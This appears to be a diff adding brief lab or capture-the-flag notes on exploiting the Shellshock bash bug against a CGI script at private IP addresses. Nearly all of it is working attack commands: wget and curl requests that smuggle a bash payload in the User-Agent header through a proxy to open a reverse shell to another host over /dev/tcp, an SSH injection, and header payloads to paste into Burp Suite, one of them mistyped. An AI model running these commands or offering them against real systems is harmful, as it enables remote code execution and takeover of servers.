@@ -1,0 +1,14 @@
+wget -q -O- -U "() { :;}; /bin/bash -i >& /dev/tcp/192.168.180.142/8080 0>&1" -e use_proxy=on -e http_proxy=192.168.180.141:3128 "http://192.168.180.141/cgi-bin/status"
+
+curl -x http://192.168.180.141:3128 -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.180.142/1234 0>&1" http://192.168.180.141/cgi-bin/status
+
+**where -x is http the proxy**
+
+
+ssh noob@192.168.180.140 -t '() { :;}; echo MALICIOUS CODE'
+
+
+You can use burpsuite and insert into the user-agent header field:
+
+() { :;}; /sbin/ifconfig
+() { :;); /usr/bin/whoami
